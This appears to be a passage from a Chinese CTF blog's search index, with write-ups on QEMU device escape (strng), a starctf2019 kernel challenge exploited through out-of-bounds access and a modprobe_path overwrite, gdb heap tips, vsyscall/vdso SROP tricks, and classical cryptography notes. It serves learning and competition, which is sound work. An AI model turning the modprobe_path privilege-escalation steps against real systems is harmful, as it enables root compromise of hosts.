\n\n二、逃逸突破口：\n\n▲qemu逃逸一般是从qemu虚拟化设备的代码中寻找漏洞，但是qemu会虚拟化很多设备，在ctf中一般需要关注的就是题目给的PCI设备。基本上都是把qemu-system-x86用IDA打开，然后从和该设备交互的函数中寻找漏洞。\n\n例如分析题目后知道了某个设备可能就是漏洞设备，这里以BlizzardCTF2017-Strng题目为例，加载了strng设备，那么就用IDA打开qemu-system-x86，然后在函数列表搜索strng，找到对应函数进行分析。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507124.png)\n\n寻找漏洞就需要更多的前置知识了：\n\n1.寻找到设备的代号，方便查看其设备地址空间：\n\n```\n#注释头\n\nubuntu@ubuntu:~$ lspci\n00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)\n00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]\n00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]\n00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)\n00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)\n00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)\n00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)\n```\n\n \n\n这里可以看到00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)，一般标记为unclassified device就是qemu启动时的命令参数中加载进入的设备，也就是strng设备。那么其对应的代号就是00:03.0，之后通过这个代号查询更多内容。\n\n2.查看PCI设备的地址空间，从而方便推断出设备实际申请的内存地址：\n\n(1)通过设备代号，找到该设备的地址空间，可以用以下命令查看：\n\n```\n#注释头\n\nlspci -v -m -n -s 00:03.0\n-------------------------------------------------------------------------\nlspci -v -m -s 00:03.0\n-----------------------------------------------------------------------\nlspci -v -s 00:03.0 -x\n------------------------------------------------------------------------\nhexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/config\n```\n\n(2)通过地址空间找到该设备申请的内存空间：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507195.png)\n\n```\n#注释头\n\nubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/config\n0000000 1234 11e9 0103 0000 0010 00ff 0000 0000\n0000010 1000 febf c051 0000 0000 0000 0000 0000\n0000020 0000 0000 0000 0000 0000 0000 1af4 1100\n0000030 0000 0000 0000 0000 0000 0000 0000 0000\n```\n\n \n\n这里通过对照，可以知道以上各个参数的实际内容。\n\n(3)然后寻找mmio和pmio的地址，这两个是PCI设备为了与qemu虚拟机进行I/O申请所映射的两块内存。由于qemu模拟设备最终都会与真实的设备进行交互，而qemu中的mmio就是相对于主机下的mmio的一段映射，所以访问这段空间就相当于访问主机下的mmio空间，那么就能跳出qemu，实现qemu逃逸。而PCI设备的大多的读写操作都在这两块内存上，所以针对这两块内存的操作函数通常也是最容易出现漏洞的地方。\n\n①mmio:与内存共享一块地址空间，共用一定数量的地址总线，cpu对该地址空间的访问会直接转化为对设备的访问。\n\n②pmio:与内存分开的，所用的地址总线和内存所用的地址总线不是一样的，cpu访问这块内存时需要使用特殊的指令进行访问。\n\n这两块内存是在BAR(base address register)中，BAR总共6个register，BAR0，BAR1...，每个BAR占据4个字节。而mmio对应BAR0，pmio对应BAR1。\n\n▲结合上图可以看到mmio的地址为0xfebf1000，pmio地址为0xc051。\n\n3.查看PCI设备初始化的函数，寻找漏洞：\n\n(1)首先查看注册strng设备的函数：这里分析可以知道strng_class_init即为初始化函数：\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507927.jpeg)\n\nobject_class_dynamic_cast_assert函数即创建了一个设备，后面的一些操作都是赋值语句，为了初始化该设备。\n\n(2)然后查看strng_instance_init函数，该函数是为了实例化设备，初始化设备的结构体，这个结构体可以在IDA中看到：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507761.jpeg)\n\n函数：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507924.jpeg)\n\n这样可以看到创建了mmio和pmio空间，大小分别为0x100和0x8。\n\n(3)现在查看对这两个空间的操作函数，这才是重点。但是需要注意的是，在这道题目中调用对mmio和pmio进行读写操作的函数时，并没有对mmio或者pmio空间进行读写操作，取而代之的是对reg数组进行读写操作。\n\n▲原因是以下结构体的定义：\n\n```\n//注释头\n\ntypedef struct {\n    PCIDevice pdev;\n    MemoryRegion mmio; //mmio内存空间\n    ......\n} STRNGState;\n\nstatic const MemoryRegionOps strng_mmio_ops = { //mmio空间对应的操作\n    .read = strng_mmio_read, //对mmio空间的read由strng_mmio_read实现\n    .write = strng_mmio_write, //对mmio空间的write由strng_mmio_write实现\n    .endianness = DEVICE_NATIVE_ENDIAN,\n};\n```\n\n原本在c语言中exp的接口函数中为：\n\n```\n#注释头\n\nmmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\n-----------------------------------------------------------------------------\n*((uint32_t*)(mmio_mem + addr)) = value;\n```\n\n对mmio和pmio空间的操作函数就会执行.read和.write函数，但是结构体由于重新将.read函数和.write定位成了strng_mmio_read和strng_mmio_write函数，这个操作某种程度上相当于修改了两个函数的got表。之后就相当于正常的pwn题了，就是利用这几个读写函数中的漏洞，最终执行system(\"cat /root/flag.txt\")即可。\n\n \n\n三、调用mmio_read和mmio_write函数\n\n在strng中，这两个函数就是strng_mmio_read和strng_mmio_write函数。\n\n1.对mmio空间操作，进而调用strng_mmio_read和strng_mmio_write函数：\n\n正常写c语言的exp编译之后，放到qemu中运行，就能通过PCI设备号从而得到mmio地址：/sys/devices/pci0000:00/0000:00:04.0/resource0。然后通过该地址和特定函数就能访问到mmio空间，跳出qemu到主机的mmio空间。\n\n①用户态访问，正常pwn题：\n\n```\n//注释头\n\n#include <assert.h>\n#include <fcntl.h>\n#include <inttypes.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include<sys/io.h>\n\nunsigned char* mmio_mem;\n\nvoid die(const char* msg)\n{\n    perror(msg);\n    exit(-1);\n}\n\nvoid mmio_write(uint32_t addr, uint32_t value)\n{\n    *((uint32_t*)(mmio_mem + addr)) = value;\n}\n\nuint32_t mmio_read(uint32_t addr)\n{\n    return *((uint32_t*)(mmio_mem + addr));\n}\n\n\nint main(int argc, char *argv[])\n{\n\n    // Open and map I/O memory for the strng device\n    int mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource0\", O_RDWR | O_SYNC);//这里需要获取到mmio的地址\n    if (mmio_fd == -1)\n        die(\"mmio_fd open failed\");\n\n    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\n    if (mmio_mem == MAP_FAILED)\n        die(\"mmap mmio_mem failed\");\n\n    printf(\"mmio_mem @ %p\\n\", mmio_mem);\n\n    mmio_read(0x128);\n    mmio_write(0x128, 1337);\n\n}\n```\n\n②内核态访问：不太知道有啥用\n\n```\n//注释头\n\n#include <asm/io.h>\n#include <linux/ioport.h>\n\nlong addr=ioremap(ioaddr,iomemsize);\nreadb(addr);\nreadw(addr);\nreadl(addr);\nreadq(addr);//qwords=8 btyes\n\nwriteb(val,addr);\nwritew(val,addr);\nwritel(val,addr);\nwriteq(val,addr);\niounmap(addr);\n```\n\n2.对pmio空间操作，进而调用strng_pmio_read和strng_pmio_write函数：\n\n①用户态访问：\n\n```\n//注释头\n\n#include <sys/io.h >\n\niopl(3);//需要先申请访问端口\ninb(port);\ninw(port);\ninl(port);\n\noutb(val,port);\noutw(val,port);\noutl(val,port);\n```\n\n②内核态访问：也不太清楚有啥用\n\n```\n//注释头\n\n#include <asm/io.h>\n#include <linux/ioport.h>\n\ninb(port); //读取一字节\ninw(port); //读取两字节\ninl(port); //读取四字节\n\noutb(val,port); //写一字节\noutw(val,port); //写两字节\noutl(val,port); //写四字节\n```\n\n3.然后就能调用到qemu中关于mmio和pmio的read，write函数了，从而挖掘漏洞，跳出qemu。\n\n \n\n \n","tags":["qemu题"],"categories":["QEMU"]},{"title":"starctf2019-hackme","url":"/2021/08/14/starctf2019-hackme/","content":"\n1.首先解包，看init，空的。\n\n2.然后看启动脚本：\n\n```bash\n#注释头\n\nqemu-system-x86_64 \\\n-m 256M \\\n-nographic \\\n-kernel bzImage \\\n-append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \\\n-monitor /dev/null \\\n-initrd initramfs.cpio \\\n-smp cores=4,threads=2 \\\n-gdb tcp::1234 \\\n-cpu qemu64,smep,smap 2>/dev/null\n```\n\n比较正常，开了smep和smap，并且4内核，2线程，这里就可能会是条件竞争的考点。\n\n3.然后拖入IDA分析：程序比较检查，类似菜单题，但是IDA中F5看伪代码中多了很多的奇怪的参数，最好以add->delete->edit->read的顺序来看比较舒服，一般的堆体分析结构也差不多怎么看。\n\n首先判断下结构体：\n\n```bash\n#注释头\n\ndataStruct:\nidx       4byte\npadding   4byte\ndata_ptr  8byte\ndata_size 8byte\noffset    8byte\n\nstruct chunkNote:\nchunk_addr 8byte\nchunk_size 8byte\n```\n\n其中pool中存储多个chunkNote结构体，不是指针，而是结构体。\n\n(1)add：没什么特别的，创建堆块，拷贝数据，存储chunk到pool中\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-31-32.png)\n\n(2)delete：也没啥问题，释放内存，指针置空。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-36-01.png)\n\n(3)edit：有点问题，这里判断了chunk指针是否存在，并且offset+size要小于等于之前保存的size。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-42-06.png)\n\n本来没啥，但是这里offset和size是int类型，可以为负数，那么就可以依据chunk_addr来向上修改数据了，相当于越界写。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-45-07.png)\n\n(4)read：同样的，也相当于越界读：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-46-46.png)\n\n▲虽说是越界写和越界读，但是由于copy系列函数，如果我们想往高地址读写的话，(内核系列函数都在高地址)offset一定需要很大，然后又要满足小于size，那么userDataSize势必要设置为负数，负数转换成unsigned long就会变得很大，基本就会导致一半的空间被覆盖，那么程序指定崩盘，所以这里还是申请pool全局变量处来进行任意读写比较好。\n\n另外也由于slub的特性，简单修改fd的话，虽然能够任意申请，但是如果fd的内存处保存的内容是个非法的，再次申请该大小的chunk程序就会崩，所以有全局变量pool就用pool。\n\n4.思考一下漏洞怎么利用。\n\n(1)首先需要地址\n\n①堆地址：释放chunkA，从chunkB向上偏移读取chunkA的fd，即可得到指向的chunkC的地址，即chunkA.fd = chunkA_addr+size*2。\n\n②内核基地址：依据任意读，从第一个chunk往上的地方读取chunk中的内容，从中筛选出vmlinux中的地址，读取之后减去偏移，即可得到内核基地址。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-45-28.png)\n\n例如这里就可以读取图中的0xffffffff81849ae0，然后减去0x849ae0即可得到基地址。当然这没有用kalsr的效果。开了之后如下，偏移也是一样的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-51-59.png)\n\n得到这次打开的基地址：0xffffffff9de00000，用命令检查一下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-59-38.png)\n\n可以看到最前面的就是内核基地址。\n\n③函数基地址：\n\ncat /proc/kallsyms|grep commit_creds\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_18-12-56.png)\n\n从kallsyms中可以查看到所有函数，减去原始基地址0xFFFFFFFF81000000再加上随机化的内核基地址就是随机化之后的函数地址了。比如上例为：\n\n0xffffffff8104d220-0xFFFFFFFF81000000+0xffffffff9de00000=0xffffffff9de4d220\n\n得到运行了kaslr的函数地址。\n\n④模块基地址：由于需要pool变量地址，所以模块的基地址肯定也需要，这里利用mod_tree来获取。mod_tree包含了所有装载的Mod的基地址。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-03-16.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-03-24.png)\n\n可以看到hackme模块的基地址也包含在里面，开了kaslr之后也是一样的。所以我们利用内核基地址得到mod_tree的地址，申请下来就可以从里面读出hackme模块的基地址。\n\n \n\n(2)然后方法就很多了，虽然开了smep,smap,kaslr：\n\n①修改modprobe_path：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-46-53.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-47-02.png)\n\n可以看到modprobe_path指向一个二进制文件\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-50-56.png)\n\n而当某个特定错误发生时，就会运行该二进制文件，且是以root权限运行的，(我尝试过，运行/bin/sh不能提权)所以如果我们把路径改成我们的二进制文件，将flag复制一下，改下权限就能打开了。(直接cat flag也不行，很奇怪)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-59-15.png)\n\n我们的二进制文件下只能类似是如下命令才行的：\n\n```bash\n#注释头\n\n#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\n\n\n#或者\n#!/bin/sh\n/bin/cat /flag > /home/pwn/flag.txt\n```\n\n注意要使用绝对路径。\n\n▲然后触发这个特定类型的错误需要一个错误格式的二进制文件：\n\n```c\n#注释头\n\nsystem(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /home/pwn/dummy\");\nsystem(\"chmod +x /home/pwn/dummy\");\n```\n\n这个elf的错误格式就是\\\\xff\\\\xff\\\\xff\\\\xff，或者其他错误格式也行。\n\n```c\n#注释头\n\nstrncpy(mem,\"/home/pwn/copy.sh\\0\",18);\nwrite_to_kernel(fd,0xc,mem,18,0);\n\nsystem(\"echo -ne '#!/bin/sh\\n/bin/cp /flag /home/pwn/flag\\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh\");\nsystem(\"chmod +x /home/pwn/copy.sh\");\nsystem(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /home/pwn/dummy\");\nsystem(\"chmod +x /home/pwn/dummy\");\n\nsystem(\"/home/pwn/dummy\");\nsystem(\"cat flag\");\n```\n\n \n","tags":["modprobe"],"categories":["pwn-kernel","Kernel_modprobe"]},{"title":"堆调试常用骚操作","url":"/2021/08/14/堆调试常用骚操作/","content":"\n1.查看内存：x/40gx addr\n\n2.查看可能用到的变量或函数地址：magic\n\n3.查看指定地方地址或值：\n\n```\n#注释头\n\np &__malloc_hook\np *__malloc_hook\np __malloc_hook\np main_arena.bins[0]\np main_arena.fastbinsY\n```\n\n4.瞎敲查看：\n\ntelescope 0x18f6000 20\n\nx/20i &__libc_realloc\n\n5.查看堆状态内容：\n\nheap; vis; parseheap; bins;\n\n6.查看函数汇编代码：\n\nx/20i &__libc_realloc\n\n7.直接从Libc.so中查找函数：\n\nreadelf -s /lib/x86_64-linux-gnu/libc-2.23.so | grep -E \"__malloc_hook|__free_hook|__realloc_hook\"\n\n \n","tags":["调试"],"categories":["PWN"]},{"title":"vsdo和vsyscall的前世今生","url":"/2021/08/14/vsdo和vsyscall的前世今生/","content":"\n一、vsyscall：一般只有ubuntu16.04,libc-2.23中有了。\n\n1.vsyscall的作用：\n\n现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall。\n\n2.vsyscall的特点：\n\n(1)某些版本存在，需要用到gdb来查看，IDA中默认不可见。\n\n(2)地址不受到ASLR和PIE的影响，固定是0xffffffffff600000-0xffffffffff601000。\n\n(3)不能从中间进入，只能从函数开头进入，意味着不能直接调用里面的syscall。这里vsyscall分为三个函数，从上到下依次是\n\n```\n#注释头\n\nA.gettimeofday: 0xffffffffff600000\nB.time:         0xffffffffff600400\nC.getcpu:       0xffffffffff600800\n```\n\n(4)gettimeofday函数执行成功时返回值就是0，保存在rax寄存器中。这就为某些one_gadget创造了条件。\n\n(5)有R,X权限，但是没有W权限，不可写，不能进行shellcode布置。\n\n(6)只有三个系统调用的函数，其余内存都以\"int3\"指令填充。\n\n3.vsyscall的利用：\n\n(1)调整栈帧，下拉rsp：\n\nvsyscall直接进行syscall，并没有利用栈空间，所以在处理栈溢出，但是由于PIE没有别的地址可以用时，而栈上又有某个有用的地址的时候，可以通过vsyscall构造一个rop链来ret，每次ret都会消耗掉一个地址，将rsp下拉一个单位，这样就可以逐渐去贴近想要的那个地址，最后成功ret到相应的位置。\n\n(2)SROP利用：\n\nsyscall ret；指令可用于构造SROP，只需要在其面前放置一个\"pop rax;ret\"的gadget，通过栈溢出将rax赋值为0xf即可调用__kernel_rt_sigreturn，从而打SROP。\n\n \n\n \n\n二、vdso：大多版本用vdso取代了vsyscall\n\n1.vdso作用：\n\n与vsyscall差不多，本来就是为了取代vsyscall用的，不过是通过共享库进行映射，和动态加载有点类似。\n\n2.vdso特点：\n\n(1)vdso的地址随机化的，且其中的指令可以任意执行，不需要从入口开始。\n\n(2)相比于栈和其他的ASLR，vdso的随机化非常的弱，对于32的系统来说，有1/256的概率命中。\n\n(3)不同的内核随机程度不同：\n\nA.较旧版本：0xf76d9000-0xf77ce000\n\nB.较新版本：0xf7ed0000-0xf7fd0000\n\n可利用pwn中Linux知识中的文件来查看具体范围。注意偏移需要更改一下，可以调试查看，一般在200以内。用stack 200，查到的地方除以4之后-2就是偏移，不行就再调试。或者直接pwndbg的fmtarg addr来查看偏移。\n\n▲范围测量：\n\n编译一个打印vdso的程序，编译代码为：\n\ngcc -g -m32 vdso_addr.c -o vdso_addr\n\n如果是64位程序则将m32改成m64即可\n\n```\n#注释头\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    printf(\"vdso addr: %124$p\\n\");//这里的124偏移需要gdb调试进行调整\n    return 0;\n}\n```\n\n然后用脚本即可打印确定范围，将范围调大更加精确：\n\n```\n#注释头\n\nimport os\nresult = []\nfor i in range(100):\n    result += [os.popen('./vdso_addr').read()[:-1]]\nresult = sorted(result)\nfor v in result:\n    print (v)\n```\n\n \n\n3.vdso的利用：\n\n与vsyscall差不多，32位中有现成的__kernel_rt_sigreturn可以打SROP。也可以用gettimeofday来创造rop，绕过PIE，滑过空间。\n\n4.读取靶机的vdso:\n\n(1)如果给了libc，那么根据libc版本使用qemu或者docker创建一个环境，随便运行一个程序，用gdb命令dump下来。(dump memory vdso32.so addr_start addr_end)\n\n(2)如果没给，那么只能先泄露地址再考虑其它。\n\n(3)之后就可以用\n\n```\n#注释头\n\nelf = ELF(“./vdso32.so”)#来加载\nRANGE_VDSO  = range(0xf7ed0000, 0xf7fd0000, 0x1000)\nvdso_addr = random.choice(RANGE_VDSO)\nSROP_kernel_addr = vdso_addr + vdso.symbols['__kernel_rt_sigreturn']\n```\n\n但是这里还是需要加上while循环爆破使用，因为不确定随机化的基地址。\n\n \n\n参考资料：\n\n[https://xz.aliyun.com/t/5236/usr/include/g](https://xz.aliyun.com/t/5236#toc-9)\n\n \n","tags":["vdso"],"categories":["pwn-kernel"]},{"title":"密码学基础","url":"/2021/08/14/密码学基础/","content":"\n&第二章 古典密码\n\n一、古典密码与现代密码定义：\n\n根据是否使用计算机进行加解密来区分古典和现代。\n\n \n\n二、古典密码两大原则：\n\n1.替代(Substitution )：按一定规则替换明文中的元素形成密文。\n\n2.置换(Transposition)：按一定规则挪移明文形成密文。\n\n \n\n三、不同分类：\n\n1.Monoalphabetic Cipher:单字母替代密码(将明文字符集和密文字符集建立映射关系)\n\n▲单表替代：明文字符集与密文字符集任意替代(一一映射)，那么n个元素即有n!种置换。(若仅仅针对字符集，那么可以通过字母的使用频率来分析解密)\n\n(1)Caesar密码：将字母用它之后的第三个字母进行替代(26个字母循环)\n\n(2)keyword密码：\n\n①key：随意选取一个关键词key\n\n②去重：将key中的重复字母去掉，例如：success->suce\n\n③填表：将去重的key填入26个字母表前面位置，依次序接着填满26个字母。\n\n```\n//注释头\n\nsuceabdfghijklmnopqrtvwxyz\nabcdefghijklmnopqrstuvwxyz\n```\n\n③加密：依据上表，查表将明文替代为密文。\n\n(3)Multiliteral Cipher：随意选取一个五字母的关键词key\n\n①填表：依据关键词key形成5×5的矩阵，将26个字母填充进去，其中i/j为一个。\n\n②加密：每个字母直接转换为key的行和列，即一个字母直接变成两个字母。\n\n(比较脆弱，因为密钥就存在于密文中)\n\n☆分析：利用字母使用频率分析：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454806.png)\n\n \n\n \n\n2.Polyalphabotic Cipher：多表替代密码，减少字母频率特征\n\n(1) Vigenere Cipher：\n\n①key：随意选取一个关键词key\n\n②对应：\n\n```\n//注释头\n\nHOLD HO LDH OLDHOLDHO\nTHIS IS THE PLAINTEXT\n```\n\n③加密：\n\nA.查表加密(行列查表都可以，因为对称的)：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454538.png)\n\nB.mod26加密：\n\n```\n//注释头\n\n0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25\nA B C D E F G H I J K  L  M  N  O  P  Q  R  S  T  U  V  W  X  Y  Z\n\n            7  14 11 3  7  14 11 3  7  14 11 3  7  14 11 3  7  14\nkey:        H  O  L  D  H  O  L  D  H  O  L  D  H  O  L  D  H  O \nplaintext:  T  H  I  S  I  S  T  H  E  P  L  A  I  N  T  E  X  T\n            19 7  8  18 8  18 19 7  4  15 11 0  8  13 19 4  23 19\n\n相加mod26：  0  21 19 21 15 6  4  10 11 3  22 3  15 1  4  7  4  7\nciphertext: A  V  T  V  P  G  E  K  L  D  W  D  P  B  E  H  E  H\n```\n\n以上两种方法都可以。\n\n☆分析：\n\n①算密钥长度：一段密文中查找重复出现的几个字节，计算重复出现的几个\n\n```\n//注释头\n\nkey:        R U N R U N R U N R U N R U N R U N R U N R U N R U N\nplaintext:  T O B E O R N O T T O B E T H A T I S T H E Q U E S T\nciphertext: K I O V I E E I G K I O V N U R N V J N U V K H V M G\n```\n\nKIOV和下一个KIVO，NU和下一个NU，分别相差9个字母，6个字母，多次重复计算，算出公因数，这里公因数是3，那么3就可能是密钥长度。\n\n②变成单表替代：假设得到公因数长度为abcdef，则进行如下计算：\n\n```\n//注释头\n\nkey:        abcde fabcd efabc defab cdefa bcdef abcde fabcd efabc defab\nciphertext: lpkso fjbnn mpfls rneoi yqrlx bkqtz ucxot ssbvb wpjil geckb\n```\n\n将所有由a加密的字母提取出来，为 ljfoxusjk.......重复多次。(这里选取abcdef中任意一个都可)。转换成6个单表替代密码，之后即可从单表替代密码ljfoxusjk.......中进行字母频率分析，逐步破译。(比如说j就有可能是e)\n\n(2)Autokey Cipher(针对Vigenere Cipher的改进)：选取关键词\n\n①key：选取关键词Key\n\n②初次：key加密对应数量的密文\n\n③重复：将前一次加密得到的密文拿来作为key加密。\n\n☆很脆弱，密文即为密钥的一部分，可通过错位分析来直接解密：\n\n```\n//注释头\n\nkey:         capcnpwgd\nplaintext:   anautokeycipherprovidesalongkeyword\nciphertext:  cnpwgd...........................\n```\n\n初始密钥为cap，之后依次得到cnp，wgd....\n\n(3)AutoKey Plaintext：(类似，但是是拿明文再进行加密)\n\n \n\n3.Rotor Ciphers：转轮密码\n\n(1)轮子的内部对应关系不变，外在触点可以转动：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454996.png)     ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454998.png)\n\n(2)利用多个轮子合在一起形成加密关系，转动触点即可改变加密关系：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454253.png)  ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454189.png)\n\n这里的初始化状态和转动方式就可看作是密钥。\n\n \n\n4.Polygraphic Cipher：多图替代密码\n\n(1)Play fair密码：双字母音节替代加密\n\n①key：随意选取密钥key\n\n②填表：key顺序加上剩余字母依次排列进5×5表中(这里key为harpsichord)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454715.png)\n\n③分组：对明文进行按两个字母一对进行分组，如果其中有字母对两个字母相同，就在其中填充一个其他字母(这个字母最好选取出现概率较小的字母，比如xx基本不会出现)：ballon -> ba lx lo on\n\n④加密：\n\nA.落在矩阵同一行的明文字母对中字母由其右边字母代替，最右边则由最左边替代。例如：AR->RP\n\nB.落在矩阵同一列的明文字母对中字母由其下边字母代替，最下面则由最上面替代。例如：IM->EV\n\nC.不同行不同列的则由对称行列转化加密(同行替换)，例如：CT->DN，OU->BQ....\n\n☆分析：(m1,m2)->(c1,c2)，那么如果有(m2,m1)，则一定是(m1,m2)->(c2,c1)。可以将明文和密文对比移位。(具体的看PDF)\n\n \n\n(2)Double playfair密码：\n\n①选取两个关键词key，去重，填表构建两个矩阵，行对应排列：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455819.png)\n\n②给定一个数字，所有明文按照所选数字分组进行排列，不足的补指定字母。例如给定明文为this is double playfair cipher，数字为10，不足补x：\n\n```\n#注释头\n\nthisisdoub\nleplayfair\n\ncipherxxxx\nxxxxxxxxxx\n```\n\n③按组进行加密，上述分组情况即为tl,he,ip.....cx,ix,px.......xx共计20组。\n\n④对每组进行加密，分别从两个矩阵中找到明文字母对，加密规则类似：\n\nA.不同行的即对角线交换：tl->op\n\nB.同行的由右边字母替代，但这里替代完之后还需要交换一下：br->ac\n\n \n\n5.Transposition cipher：\n\n(1)Skytale cipher：缠绕密码，一张图说明一切\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454647.png)\n\n(2)Permutation cipher：\n\n①给定密钥，按字母表排列顺序。例如key，顺序为(2 1 3)。\n\n②依据密钥长度分组明文，不足补指定字符。例如Permutation cipher，分为Per mut ati onc iph erx(最后补了x)\n\n③根据密钥顺序置换，(2 1 3)即代表第二个字母放到第一个，第一个字母放到第二个，第三个字母放到第三个。可得ePr umt tai noc pih rex即为所求密文。\n\n(3)Column Permutation cipher：\n\n①给定密钥，按字母表排列顺序。例如key，顺序为(2 1 3)。\n\n②依据密钥长度分组明文，竖向排列。例如Permutation cipher，分为\n\n```\n#注释头\n\n213\nPer \nmut \nati \nonc \niph \ner\n```\n\n③依据顺序将列竖向提取，横向生成密文：eutnpr Pmaonie rtich即为所求密文。\n\n(4)Double Permutation cipher：一样，只是重复两次\n\n \n\n&第三章 流密码 Stream Cipher 生成\n\n1.LFSR：给定初始值，指定反馈位异或生成从左边进入，从右边出来生成生成密钥流，这里就会是101011 00....\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455530.png)\n\n☆针对LFSR攻击：将密文逐两个异或得到分析段，如图第一段为密文段，第二段为分析段，其中重复部分相距的长度即为LFSR的两个线性反馈位的长度，这里是4，如上图的LFSR，之后再分析破解。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454156.png)\n\n2.RC4：\n\n(1)初始化一个数组S[]，一般为0-255，这里假设为0-7，S[]:[0,1,2,3,4,5,6,7]。之后初始化一个key顺序数组K[]给定初始密钥顺序，假设为567，重复至8位K[]:[5,6,7,5,6,7,5,6]。\n\n(2)通过KSA算法代码：\n\n```\n#注释头\n\nj = 0 \nfor i in range(0,255):\n    j = (j + S[i] + K[i])mod 256 \n    tmp = S[i]\n    S[i] = S[j]\n    S[j] = tmp\n```\n\n上述例子得到新的S[]:[5,4,0,7,1,6,3,2]\n\n(3)通过PRGA算法：\n\n```\n#注释头\n\ni = 0\nj = 0\ni = (i + 1)mod 256\nj = (j + S[i]) mod 256\n\ntmp = S[i] \nS[i] = S[j] \nS[j] = tmp\n\nt = (S[j] + S[i])mod 256\nk = S[t]\n```\n\n上述例子得到K = 6，之后重复8次(n)，即可得到最终密钥K\n\n \n\n3.CA：cellular automata细胞自动机\n\n(1)1D，即一维的：\n\n①给定初始状态(一般随机生成)，这里选为0010100(多少bit都行)。\n\n②给定状态转换规则，一般给一个十进制数字，然后转换为二进制，这里选为23：\n\n```\n#注释头\n\n000 001 010 011 100 101 110 111\n 0   0   0   1   0   1   1   1   = 23\n```\n\n③依据规则演变至下一个状态(依据当前位和左右邻位)，那么初始状态就可以对应以下七种状态：\n\n000 001 010 101 010 100 000\n\n依据规则转化为 